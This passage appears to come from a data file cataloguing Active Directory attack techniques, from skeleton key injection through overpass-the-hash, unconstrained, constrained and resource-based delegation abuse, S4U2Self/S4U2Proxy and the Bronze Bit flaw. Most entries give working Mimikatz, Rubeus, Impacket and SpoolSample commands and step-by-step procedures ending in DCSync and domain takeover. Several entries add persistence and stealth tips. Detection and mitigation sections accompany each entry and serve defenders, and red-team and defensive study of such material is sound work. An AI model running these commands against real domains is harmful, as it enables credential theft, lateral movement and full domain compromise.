        command: "net use \\\\dc01.domain.local\\ipc$ /user:domain.local\\Administrator mimikatz",
        description: "Tests the skeleton key by authenticating as Administrator using the skeleton key password"
      }
    ],
    steps: [
      "Step 1: Gain Domain Admin or SYSTEM access on a domain controller. This can be achieved through prior compromise, pass-the-hash, Golden Ticket, or other privilege escalation techniques.",
      "Step 2: Verify that LSASS is not running as a Protected Process Light (PPL). Check with: Get-Process lsass | Select-Object ProcessName, Id, @{N='PPL';E={(Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa).RunAsPPL}}. If PPL is enabled, the skeleton key injection will fail.",
      "Step 3: Verify that Credential Guard is not enabled: Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard. If VirtualizationBasedSecurityStatus is 2 (running), the attack will fail.",
      "Step 4: Execute Mimikatz with debug privileges and run the skeleton key module: privilege::debug followed by misc::skeleton. Mimikatz will patch the LSASS process in memory to accept the secondary password.",
      "Step 5: Verify the skeleton key is active by authenticating to the domain controller using any account with the password 'mimikatz'. For example: runas /user:domain.local\\anyuser cmd (enter 'mimikatz' as the password).",
      "Step 6: The skeleton key works for NTLM authentication on the patched domain controller. If the environment has multiple domain controllers, the patch must be applied to each one separately for full coverage.",
      "Step 7: For persistence across reboots, consider combining with a scheduled task or startup script that reapplies the Mimikatz skeleton key patch after each reboot. Note that this increases detection risk.",
      "Step 8: To clean up, simply reboot the domain controller. The LSASS patch is in-memory only and does not persist on disk."
    ],
    detection: "Monitor for Event ID 7045 (A service was installed in the system) on domain controllers, as Mimikatz may install a temporary service. Monitor for LSASS process access events (Event ID 4656, 4663) with suspicious access masks. Enable the Sysmon driver and monitor for Event ID 10 (ProcessAccess) targeting lsass.exe. Look for anomalous authentication patterns where the same password hash is used across multiple accounts. Microsoft Defender for Identity can detect Skeleton Key attacks by monitoring LSASS integrity. Regular LSASS memory integrity checking tools can detect the patched state. Monitor for debug privilege usage (SeDebugPrivilege) on domain controllers via Event ID 4672.",
    mitigation: "Enable LSASS as a Protected Process Light (PPL) by setting the registry key HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL to 1. Deploy Windows Credential Guard which isolates LSASS credentials in a virtualization-based security container. Implement strict admin tiering so that Domain Admin credentials are only used on domain controllers. Deploy endpoint detection and response (EDR) solutions on domain controllers. Use Smart Card authentication which is not affected by the Skeleton Key patch. Regularly reboot domain controllers as the patch does not survive restarts.",
    references: [
      "https://attack.mitre.org/techniques/T1556/001/",
      "https://adsecurity.org/?p=1255",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/intalling-skeleton-key"
    ]
  },
  {
    id: "AD-008",
    name: "Overpass-the-Hash / Pass-the-Key",
    category: "lateral_movement",
    description: "Overpass-the-Hash (also known as Pass-the-Key) is a technique that converts an NTLM hash or Kerberos AES key into a Kerberos TGT, allowing the attacker to authenticate using Kerberos protocol even when they only possess the NTLM hash. In a traditional Pass-the-Hash attack, the NTLM hash is used directly for NTLM authentication. However, many modern environments disable or restrict NTLM authentication, making traditional PtH less effective. Overpass-the-Hash overcomes this by using the hash to perform Kerberos pre-authentication (AS-REQ), obtaining a legitimate TGT from the KDC. This TGT can then be used for standard Kerberos authentication to any service. The technique is particularly useful in environments that have disabled NTLM or where Kerberos authentication is required. The AES variant (Pass-the-Key) uses the user's AES128 or AES256 key instead of the NTLM hash, which is stealthier as it matches the expected encryption type in environments that have disabled RC4.",
    prerequisites: [
      "NTLM hash or AES key of the target user account",
      "Network access to a domain controller on port 88 (Kerberos)",
      "Knowledge of the domain FQDN"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Rubeus",
        command: "Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:domain.local /ptt",
        description: "Requests a TGT using the NTLM hash and injects it into the current session"
      },
      {
        name: "Rubeus (AES key)",
        command: "Rubeus.exe asktgt /user:Administrator /aes256:AES256_KEY /domain:domain.local /opsec /ptt",
        description: "Requests a TGT using an AES256 key with opsec-safe options"
      },
      {
        name: "Mimikatz",
        command: "mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe\"",
        description: "Starts a new process with the overpass-the-hash Kerberos ticket"
      },
      {
        name: "Impacket getTGT",
        command: "python3 getTGT.py domain.local/Administrator -hashes :NTLM_HASH -dc-ip 10.0.0.1",
        description: "Requests a TGT from Linux using the NTLM hash, saves as .ccache file"
      },
      {
        name: "Impacket getTGT (AES)",
        command: "python3 getTGT.py domain.local/Administrator -aesKey AES256_KEY -dc-ip 10.0.0.1",
        description: "Requests a TGT using an AES256 key from Linux"
      }
    ],
    steps: [
      "Step 1: Obtain the NTLM hash or AES key of the target user. This can be done via credential dumping (Mimikatz sekurlsa::logonpasswords, NTDS.dit extraction, DCSync) or by cracking captured network hashes.",
      "Step 2: Use Rubeus asktgt or Mimikatz sekurlsa::pth to perform the overpass-the-hash. Rubeus requests a TGT from the KDC using the hash/key, while Mimikatz creates a new logon session with the credentials injected.",
      "Step 3: For Rubeus, use /ptt to inject the TGT into the current session. The ticket will appear in klist output and be used for subsequent Kerberos authentication.",
      "Step 4: For Mimikatz, the /run parameter spawns a new process (e.g., cmd.exe) under a new logon session with the Kerberos ticket. All subsequent network operations from this process use the overpass-the-hash identity.",
      "Step 5: From Linux, use Impacket's getTGT.py to obtain the TGT and save it as a .ccache file. Set KRB5CCNAME=output.ccache to use it with other Impacket tools.",
      "Step 6: Verify the ticket by accessing network resources: dir \\\\target\\share or klist to confirm the Kerberos ticket is active.",
      "Step 7: For stealth, prefer the AES key variant (/aes256:) over the NTLM hash (/rc4:) as AES is the expected encryption type in modern environments. Using RC4 when AES is the norm triggers detection rules.",
      "Step 8: Use the obtained Kerberos identity to perform lateral movement, access file shares, execute commands via PsExec/WMI/WinRM, or perform further attacks like Kerberoasting with the elevated context."
    ],
    detection: "Monitor for Event ID 4768 (TGT Request) with RC4 encryption type (0x17) when the environment uses AES, which indicates potential overpass-the-hash. Event ID 4624 (Logon) with Logon Type 9 (NewCredentials) on the source machine indicates Mimikatz's sekurlsa::pth creating a new logon session. Watch for process creation events where a new cmd.exe or powershell.exe spawns with a different logon session than its parent. Microsoft Defender for Identity detects overpass-the-hash by correlating NTLM credential exposure with subsequent Kerberos authentication. Monitor for unusual Kerberos authentication from workstations at unusual times.",
    mitigation: "Disable RC4 for Kerberos authentication domain-wide to prevent NTLM hash-based overpass-the-hash (this forces attackers to obtain AES keys which are harder to extract). Implement the Protected Users group which prevents NTLM hash caching and enforces AES-only Kerberos. Deploy Credential Guard to protect credentials in memory. Implement network segmentation and restrict lateral movement paths. Use Local Administrator Password Solution (LAPS) to prevent credential reuse. Enable advanced audit policies on all workstations and servers.",
    references: [
      "https://attack.mitre.org/techniques/T1550/002/",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/over-pass-the-hash-pass-the-key",
      "https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/"
    ]
  },
  {
    id: "AD-009",
    name: "Unconstrained Delegation Abuse",
    category: "delegation_abuse",
    description: "Unconstrained delegation is a Kerberos feature that allows a service to impersonate any user who authenticates to it by caching their TGT in memory. When a user authenticates to a server configured with unconstrained delegation, their TGT is included in the TGS-REQ and cached in the server's LSASS process. An attacker who compromises a server with unconstrained delegation can extract these cached TGTs and use them to impersonate any user who connects to the server. The attack becomes particularly powerful when combined with authentication coercion techniques like the PrinterBug (SpoolSample) or PetitPotam, which can force a domain controller's machine account to authenticate to the compromised server, allowing the attacker to capture the DC's TGT and effectively compromise the entire domain. Unconstrained delegation is identified by the TRUSTED_FOR_DELEGATION flag (UserAccountControl value 524288) on computer or user objects. Domain controllers always have this flag set, making them particularly sensitive targets.",
    prerequisites: [
      "Administrative access on a server configured with unconstrained delegation",
      "The target server must have TRUSTED_FOR_DELEGATION set",
      "Ability to coerce or wait for high-value accounts to authenticate to the compromised server"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "PowerView (enumeration)",
        command: "Get-DomainComputer -Unconstrained | Select-Object samaccountname, dnshostname, useraccountcontrol",
        description: "Enumerates all computers configured with unconstrained delegation"
      },
      {
        name: "ADFind",
        command: "AdFind.exe -b \"dc=domain,dc=local\" -f \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\" cn dnshostname",
        description: "Finds all objects with the TRUSTED_FOR_DELEGATION flag using ADFind"
      },
      {
        name: "Rubeus (monitor)",
        command: "Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap",
        description: "Monitors for incoming TGTs from the DC machine account in real-time"
      },
      {
        name: "Rubeus (dump TGTs)",
        command: "Rubeus.exe triage",
        description: "Lists all Kerberos tickets currently cached in memory on the compromised server"
      },
      {
        name: "Rubeus (extract)",
        command: "Rubeus.exe dump /luid:0x12345 /service:krbtgt /nowrap",
        description: "Extracts a specific TGT from LSASS by logon session ID"
      },
      {
        name: "SpoolSample",
        command: "SpoolSample.exe dc01.domain.local compromised-server.domain.local",
        description: "Forces the DC to authenticate to the compromised server via the Print Spooler service"
      },
      {
        name: "Mimikatz",
        command: "mimikatz.exe \"sekurlsa::tickets /export\"",
        description: "Exports all Kerberos tickets from LSASS memory to .kirbi files"
      }
    ],
    steps: [
      "Step 1: Enumerate servers with unconstrained delegation enabled using PowerView Get-DomainComputer -Unconstrained or LDAP filter (userAccountControl:1.2.840.113556.1.4.803:=524288). Exclude domain controllers which always have this flag.",
      "Step 2: Compromise one of the identified servers with unconstrained delegation. This requires local administrator access on the target server.",
      "Step 3: On the compromised server, start Rubeus in monitor mode to capture incoming TGTs: Rubeus.exe monitor /interval:5 /nowrap. This will display base64-encoded tickets as they arrive.",
      "Step 4: Coerce a high-value target (ideally a domain controller) to authenticate to the compromised server. Use SpoolSample.exe (PrinterBug) to trigger the DC's print spooler: SpoolSample.exe dc01.domain.local compromised.domain.local. Alternatively, use PetitPotam or other coercion techniques.",
      "Step 5: When the DC authenticates, its machine account TGT is cached on the compromised server. Rubeus monitor will capture it and display the base64-encoded ticket.",
      "Step 6: Import the captured TGT using Rubeus: Rubeus.exe ptt /ticket:BASE64_TICKET. This injects the DC's machine account TGT into your session.",
      "Step 7: With the DC's TGT, perform a DCSync attack to extract all domain credentials: mimikatz.exe \"lsadump::dcsync /domain:domain.local /all /csv\". The DC machine account has the necessary replication privileges.",
      "Step 8: For ongoing access, extract the krbtgt hash from the DCSync output and create Golden Tickets for persistent domain access."
    ],
    detection: "Monitor for Event ID 4769 (TGS Request) where the service has unconstrained delegation and the connecting account is a high-privilege account or DC machine account. Watch for the SpoolSample/PrinterBug coercion via RPC calls to the Print Spooler service (Event ID 5145 on the target for named pipe access to \\spoolss). Monitor for Rubeus execution and LSASS access on servers with unconstrained delegation. Alert on DCSync (Event ID 4662 with DS-Replication-Get-Changes extended rights) originating from non-DC machine accounts. Microsoft Defender for Identity can detect unconstrained delegation abuse patterns.",
    mitigation: "Remove unconstrained delegation from all servers where it is not absolutely necessary. Migrate to constrained delegation or Resource-Based Constrained Delegation (RBCD) instead. Add high-value accounts (Domain Admins, service accounts) to the Protected Users group which prevents TGT delegation. Set the 'Account is sensitive and cannot be delegated' flag on privileged accounts. Disable the Print Spooler service on all domain controllers and servers where it is not needed: Stop-Service Spooler; Set-Service Spooler -StartupType Disabled. Monitor delegation configurations regularly.",
    references: [
      "https://attack.mitre.org/techniques/T1558/",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation",
      "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
    ]
  },
  {
    id: "AD-010",
    name: "Constrained Delegation Abuse",
    category: "delegation_abuse",
    description: "Constrained delegation restricts which services a delegating account can access on behalf of other users, using the msDS-AllowedToDelegateTo attribute to specify allowed target SPNs. An attacker who compromises an account with constrained delegation can abuse the S4U (Service for User) protocol extensions to obtain service tickets for any user (including Domain Admins) to the allowed target services. The attack uses two protocol extensions: S4U2Self (which obtains a forwardable service ticket to the compromised service on behalf of any user) and S4U2Proxy (which uses that forwardable ticket to request a service ticket to an allowed target service). Constrained delegation can be configured with or without protocol transition. With protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION), the service can use S4U2Self to obtain tickets for users who have not authenticated to it. Without protocol transition, S4U2Self tickets are not forwardable unless the Bronze Bit vulnerability (CVE-2020-17049) is exploited. Additionally, the SPN specified in msDS-AllowedToDelegateTo can often be altered to access different services on the same target host due to how Kerberos handles service names.",
    prerequisites: [
      "Compromised account (user or computer) with constrained delegation configured",
      "msDS-AllowedToDelegateTo must be set on the compromised account",
      "Network access to the domain controller",
      "For protocol transition: TRUSTED_TO_AUTH_FOR_DELEGATION must be set"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "PowerView (enumeration)",
        command: "Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto",
        description: "Enumerates user accounts with constrained delegation configured"
      },
      {
        name: "PowerView (computers)",
        command: "Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto",
        description: "Enumerates computer accounts with constrained delegation configured"
      },
      {
        name: "Rubeus",
        command: "Rubeus.exe s4u /user:svc_web /rc4:SVC_HASH /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /ptt",
        description: "Performs the full S4U2Self+S4U2Proxy chain to obtain a CIFS ticket as Administrator"
      },
      {
        name: "Rubeus (altservice)",
        command: "Rubeus.exe s4u /user:svc_web /rc4:SVC_HASH /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /altservice:host,http,wsman,ldap /ptt",
        description: "Requests tickets for alternative services on the same target using SPN substitution"
      },
      {
        name: "Impacket getST",
        command: "python3 getST.py domain.local/svc_web -hashes :SVC_HASH -spn cifs/fileserver.domain.local -impersonate Administrator -dc-ip 10.0.0.1",
        description: "Performs S4U delegation from Linux to obtain a service ticket as Administrator"
      }
    ],
    steps: [
      "Step 1: Enumerate accounts with constrained delegation using PowerView or LDAP: Get-DomainUser -TrustedToAuth and Get-DomainComputer -TrustedToAuth. Note the msDS-AllowedToDelegateTo values which show what services can be accessed.",
      "Step 2: Determine if protocol transition is enabled by checking for the TRUSTED_TO_AUTH_FOR_DELEGATION flag (UAC value 16777216). This determines whether S4U2Self can produce forwardable tickets.",
      "Step 3: Obtain the credential material (NTLM hash or AES key) for the delegating account. If it is a service account, try Kerberoasting first. If it is a machine account, extract from LSASS or NTDS.dit.",
      "Step 4: Use Rubeus s4u to perform the delegation attack. First, S4U2Self obtains a service ticket impersonating the target user (e.g., Administrator) to the compromised service. Then S4U2Proxy uses this ticket to request a ticket to the allowed target service.",
      "Step 5: If the delegation target SPN is for CIFS but you need other access, use the /altservice flag to request tickets for HOST, HTTP, WSMAN, LDAP, or other services on the same machine. Kerberos service tickets are often interchangeable for different services on the same host.",
      "Step 6: Inject the resulting ticket with /ptt and access the target service. For CIFS, try dir \\\\target\\c$. For HOST, use PsExec. For HTTP/WSMAN, use PowerShell Remoting.",
      "Step 7: From Linux, use Impacket getST.py with -impersonate to perform the full S4U chain, then set KRB5CCNAME to the output .ccache file for use with Impacket tools like psexec.py -k -no-pass.",
      "Step 8: If constrained delegation to a DC LDAP service is configured, the resulting ticket can be used for DCSync: secretsdump.py -k -no-pass domain.local/Administrator@dc01.domain.local."
    ],
    detection: "Monitor for Event ID 4769 with specific delegation flags in the ticket options field. S4U2Self generates TGS-REQ events with the constrained delegation flags set. Watch for S4U2Proxy requests (Event ID 4769 where the requesting account is different from the target account). Alert on constrained delegation being used to access sensitive services (LDAP on DCs, CIFS on file servers). Monitor for alternative service name requests where the SPN in the ticket differs from the allowed delegation target. Microsoft Defender for Identity can detect anomalous delegation patterns.",
    mitigation: "Minimize the use of constrained delegation. Where possible, use Resource-Based Constrained Delegation (RBCD) instead, as it provides better control. Do not configure delegation to sensitive services on domain controllers (LDAP, CIFS, HOST). Add sensitive accounts to the Protected Users group which prevents delegation of their credentials. Set the 'Account is sensitive and cannot be delegated' flag on Domain Admins and other high-value accounts. Regularly audit delegation configurations: Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo.",
    references: [
      "https://attack.mitre.org/techniques/T1558/",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation",
      "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
    ]
  },
  {
    id: "AD-011",
    name: "Resource-Based Constrained Delegation (RBCD)",
    category: "delegation_abuse",
    description: "Resource-Based Constrained Delegation (RBCD) is a form of delegation introduced in Windows Server 2012 that reverses the direction of delegation control. Instead of specifying which services a delegating account can access (traditional constrained delegation via msDS-AllowedToDelegateTo), RBCD specifies which accounts are allowed to delegate to a target resource (via msDS-AllowedToActOnBehalfOfOtherIdentity). An attacker who has write access to a target computer's AD object (GenericAll, GenericWrite, WriteProperty, or WriteDACL permissions) can modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to allow a controlled account to delegate to the target. The attacker then uses S4U2Self and S4U2Proxy to obtain service tickets for any user (including Domain Admins) to the target. This attack is powerful because it requires only write permission on the target computer object, which is a common misconfiguration, and a controlled account with an SPN (typically a machine account created via the MachineAccountQuota).",
    prerequisites: [
      "Write permissions (GenericAll, GenericWrite, WriteProperty, or WriteDACL) on the target computer object in AD",
      "Control over an account with an SPN (can create a machine account if MachineAccountQuota > 0)",
      "Network access to the domain controller"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "PowerView (check write access)",
        command: "Get-DomainObjectAcl -Identity 'TARGET-SERVER$' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteProperty'}",
        description: "Checks who has write permissions on the target computer object"
      },
      {
        name: "PowerMad (create machine account)",
        command: "New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)",
        description: "Creates a new machine account using the default MachineAccountQuota"
      },
      {
        name: "PowerView (set RBCD)",
        command: "Set-DomainObject -Identity 'TARGET-SERVER$' -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose",
        description: "Configures RBCD on the target computer object to allow delegation from the controlled machine account"
      },
      {
        name: "Rubeus",
        command: "Rubeus.exe s4u /user:FAKE01$ /rc4:MACHINE_HASH /impersonateuser:Administrator /msdsspn:cifs/target-server.domain.local /ptt",
        description: "Performs S4U2Self+S4U2Proxy via the RBCD configuration to get a ticket as Administrator"
      },
      {
        name: "Impacket rbcd",
        command: "python3 rbcd.py domain.local/user:password -delegate-to 'TARGET-SERVER$' -delegate-from 'FAKE01$' -action write -dc-ip 10.0.0.1",
        description: "Configures RBCD on the target computer object from Linux"
      },
      {
        name: "Impacket getST",
        command: "python3 getST.py domain.local/FAKE01$:Password123! -spn cifs/target-server.domain.local -impersonate Administrator -dc-ip 10.0.0.1",
        description: "Obtains a service ticket as Administrator via RBCD from Linux"
      }
    ],
    steps: [
      "Step 1: Identify target computers where you have write access to the AD object. Use BloodHound to find GenericAll, GenericWrite, or WriteProperty edges to computer objects. Alternatively, use PowerView: Get-DomainObjectAcl -Identity 'TARGET$' -ResolveGUIDs.",
      "Step 2: Check if you can create a machine account. Query the MachineAccountQuota: Get-DomainObject -Identity 'DC=domain,DC=local' -Properties ms-DS-MachineAccountQuota. Default value is 10, meaning any authenticated user can create up to 10 machine accounts.",
      "Step 3: Create a controlled machine account using PowerMad: New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force). From Linux, use Impacket addcomputer.py.",
      "Step 4: Configure RBCD on the target by setting msDS-AllowedToActOnBehalfOfOtherIdentity to a security descriptor containing the SID of your controlled machine account. Use PowerView Set-DomainObject or Impacket rbcd.py.",
      "Step 5: Use Rubeus or Impacket to perform the S4U2Self+S4U2Proxy chain from the controlled machine account to the target. S4U2Self gets a ticket as the target user (e.g., Administrator) to your machine, and S4U2Proxy forwards it to the target service.",
      "Step 6: Inject the resulting ticket and access the target. For CIFS: dir \\\\target\\c$. For remote execution: PsExec or smbexec.py.",
      "Step 7: If the target is a domain controller, you can use the ticket for DCSync by requesting LDAP service access instead of CIFS.",
      "Step 8: Clean up by removing the RBCD configuration: Set-DomainObject -Identity 'TARGET$' -Clear msds-allowedtoactonbehalfofotheridentity."
    ],
    detection: "Monitor for modifications to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute via Event ID 5136 (Directory Service Object Modification). Alert on new machine account creation events (Event ID 4741) especially from non-administrative users. Watch for S4U2Self and S4U2Proxy events (Event ID 4769) involving recently created machine accounts. BloodHound can identify potential RBCD attack paths during security assessments. Monitor for MachineAccountQuota exploitation by tracking machine account creation rates per user.",
    mitigation: "Set MachineAccountQuota to 0 to prevent unprivileged users from creating machine accounts: Set-ADDomain -Identity domain.local -Replace @{'ms-DS-MachineAccountQuota'='0'}. Audit and restrict write permissions on computer objects -- remove unnecessary GenericAll/GenericWrite delegations. Monitor the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for unauthorized changes. Add sensitive accounts to the Protected Users group to prevent delegation of their credentials. Implement tiered administration to limit who can modify AD objects.",
    references: [
      "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-target-exploitation",
      "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation"
    ]
  },
  {
    id: "AD-012",
    name: "S4U2Self Abuse",
    category: "delegation_abuse",
    description: "S4U2Self (Service for User to Self) is a Kerberos protocol extension that allows a service to obtain a service ticket to itself on behalf of any user, without requiring that user's password or TGT. This was designed for scenarios where a service needs to make authorization decisions based on the user's identity even when the user authenticated via a non-Kerberos mechanism (such as form-based authentication). An attacker who controls a service account with the TRUSTED_TO_AUTH_FOR_DELEGATION flag can use S4U2Self to obtain forwardable service tickets for any user, including Domain Admins and other protected accounts (unless they are in the Protected Users group or have the 'cannot be delegated' flag set). The forwardable ticket obtained through S4U2Self can then be used with S4U2Proxy to access other services on behalf of the impersonated user. Even without the TRUSTED_TO_AUTH_FOR_DELEGATION flag, S4U2Self still returns a valid (but non-forwardable) ticket, which can be useful for local authorization decisions or can be made forwardable via the Bronze Bit vulnerability.",
    prerequisites: [
      "Control over a service account with an SPN",
      "TRUSTED_TO_AUTH_FOR_DELEGATION flag for forwardable tickets",
      "Or: Bronze Bit (CVE-2020-17049) vulnerability on unpatched DCs to forge forwardable flag"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Rubeus",
        command: "Rubeus.exe s4u /user:svc_account /rc4:SVC_HASH /impersonateuser:Administrator /self /ptt",
        description: "Performs S4U2Self to obtain a service ticket as Administrator to the controlled service"
      },
      {
        name: "Impacket getST",
        command: "python3 getST.py domain.local/svc_account -hashes :SVC_HASH -impersonate Administrator -self -dc-ip 10.0.0.1",
        description: "Performs S4U2Self from Linux using Impacket"
      },
      {
        name: "PowerView (check flag)",
        command: "Get-DomainUser -TrustedToAuth | Select-Object samaccountname, useraccountcontrol, msds-allowedtodelegateto",
        description: "Checks which accounts have the TRUSTED_TO_AUTH_FOR_DELEGATION flag"
      }
    ],
    steps: [
      "Step 1: Identify accounts with the TRUSTED_TO_AUTH_FOR_DELEGATION flag using PowerView or LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=16777216).",
      "Step 2: Obtain credentials for the service account (hash, AES key, or password). If the account has an SPN, Kerberoasting may be possible.",
      "Step 3: Use Rubeus s4u with the /self flag to perform S4U2Self, requesting a service ticket as the target user (e.g., Administrator) to the controlled service.",
      "Step 4: If the TRUSTED_TO_AUTH_FOR_DELEGATION flag is set, the resulting ticket will be forwardable, enabling it to be used with S4U2Proxy for delegation to other services.",
      "Step 5: If the flag is not set, the ticket will not be forwardable. On unpatched DCs, the Bronze Bit vulnerability can be used to flip the forwardable flag.",
      "Step 6: Use the S4U2Self ticket for authorization bypass on the controlled service, or chain it with S4U2Proxy for access to other services configured in the delegation chain."
    ],
    detection: "Monitor for Event ID 4769 (TGS Request) with S4U2Self protocol transition flags. The ticket options field in the event will contain specific flags indicating an S4U operation. Watch for S4U2Self requests for high-value accounts (Domain Admins, Enterprise Admins). Alert when S4U2Self is performed by accounts that do not normally use this protocol extension. Microsoft Defender for Identity can detect anomalous S4U activity.",
    mitigation: "Minimize the number of accounts with TRUSTED_TO_AUTH_FOR_DELEGATION. Use the Protected Users group for sensitive accounts, which prevents S4U2Self impersonation. Set the 'Account is sensitive and cannot be delegated' flag on high-value accounts. Regularly audit which accounts have the protocol transition flag enabled. Patch domain controllers to address the Bronze Bit vulnerability (KB4598347).",
    references: [
      "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13",
      "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
    ]
  },
  {
    id: "AD-013",
    name: "S4U2Proxy Abuse",
    category: "delegation_abuse",
    description: "S4U2Proxy (Service for User to Proxy) is the second stage of the S4U Kerberos delegation chain that allows a service to request a service ticket to another service on behalf of a user. The service presents a forwardable service ticket (obtained via S4U2Self or from a normal user authentication) to the KDC, along with a request for a ticket to a specific target service. The KDC validates that the requesting service is authorized to delegate to the target (via msDS-AllowedToDelegateTo or msDS-AllowedToActOnBehalfOfOtherIdentity) and issues a new service ticket for the target service in the name of the impersonated user. An attacker can abuse S4U2Proxy by chaining it with S4U2Self to access any service listed in the delegation configuration as any user. A key detail is that the SPN specified in msDS-AllowedToDelegateTo only controls which host is allowed -- the actual service class (CIFS, HTTP, LDAP, etc.) can often be substituted using the /altservice technique in Rubeus, because the service ticket's service name is not validated against the allowed list by some services.",
    prerequisites: [
      "A forwardable service ticket obtained via S4U2Self or user authentication",
      "The delegating account must be authorized to delegate to the target (constrained delegation or RBCD)",
      "Target service SPN must be reachable"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Rubeus (full chain)",
        command: "Rubeus.exe s4u /user:svc_web /rc4:SVC_HASH /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /altservice:host,http,ldap /ptt",
        description: "Performs S4U2Self followed by S4U2Proxy with alternative service name substitution"
      },
      {
        name: "Impacket getST",
        command: "python3 getST.py domain.local/svc_web -hashes :SVC_HASH -spn cifs/fileserver.domain.local -impersonate Administrator -dc-ip 10.0.0.1",
        description: "Performs the full S4U chain from Linux, saving the ticket as a .ccache file"
      }
    ],
    steps: [
      "Step 1: Identify the delegation configuration on the compromised account. Check msDS-AllowedToDelegateTo for constrained delegation or msDS-AllowedToActOnBehalfOfOtherIdentity on target computers for RBCD.",
      "Step 2: Obtain a forwardable service ticket via S4U2Self (Step 1 of the chain). This ticket impersonates the desired target user to the compromised service.",
      "Step 3: Present the forwardable ticket to the KDC via S4U2Proxy, requesting a service ticket to the allowed target service. The KDC validates the delegation authorization and issues the new ticket.",
      "Step 4: Use the /altservice flag in Rubeus to request tickets for additional services on the target host. If the delegation allows CIFS, you can often substitute HOST, HTTP, LDAP, WSMAN, etc.",
      "Step 5: Inject the resulting ticket(s) and access the target services. Multiple service types may be needed: CIFS for file access, HOST for PsExec, LDAP for AD operations, HTTP for WinRM.",
      "Step 6: If the delegation target is a domain controller's LDAP service, use the ticket for DCSync to extract all domain credentials."
    ],
    detection: "Monitor Event ID 4769 for S4U2Proxy operations, which show a different requesting user than the target account. Watch for service ticket requests where the SPN service class differs from the configured delegation target (altservice abuse). Alert on delegation to sensitive services on domain controllers. Monitor for patterns of S4U2Self immediately followed by S4U2Proxy from the same source.",
    mitigation: "Restrict constrained delegation targets to non-sensitive services. Do not configure delegation to domain controller services (LDAP, CIFS, HOST). Use the Protected Users group for accounts that should not be delegated. Implement strict monitoring on delegation configuration changes. Consider using RBCD instead of traditional constrained delegation for better control.",
    references: [
      "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation"
    ]
  },
  {
    id: "AD-014",
    name: "Bronze Bit Attack (CVE-2020-17049)",
    category: "delegation_abuse",
    description: "The Bronze Bit attack exploits CVE-2020-17049, a vulnerability in the Kerberos protocol implementation in Windows that allows an attacker to flip the forwardable flag in a service ticket. In the normal S4U2Self flow, if the service account does not have the TRUSTED_TO_AUTH_FOR_DELEGATION flag, the resulting ticket is not marked as forwardable, preventing it from being used with S4U2Proxy for constrained delegation. The Bronze Bit vulnerability allows the attacker to modify the encrypted ticket data to set the forwardable flag, because the KDC did not properly validate this flag during the S4U2Proxy exchange. This effectively bypasses the protection transition requirement for constrained delegation and also bypasses the 'Account is sensitive and cannot be delegated' flag and Protected Users group membership, as these protections relied on the forwardable flag to prevent delegation. The vulnerability was patched in December 2020 (KB4598347) but required a phased enforcement approach. Named by Jake Karnes of NetSPI, the Bronze Bit attack significantly expanded the attack surface for constrained delegation abuse.",
    prerequisites: [
      "Compromised service account with constrained delegation configured (msDS-AllowedToDelegateTo set)",
      "Unpatched domain controller (or patched DC with enforcement not enabled)",
      "Hash or key of the compromised service account"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Impacket getST (Bronze Bit)",
        command: "python3 getST.py domain.local/svc_web -hashes :SVC_HASH -spn cifs/target.domain.local -impersonate Administrator -force-forwardable -dc-ip 10.0.0.1",
        description: "Performs S4U with the -force-forwardable flag to exploit the Bronze Bit vulnerability"
      },
      {
        name: "Rubeus",
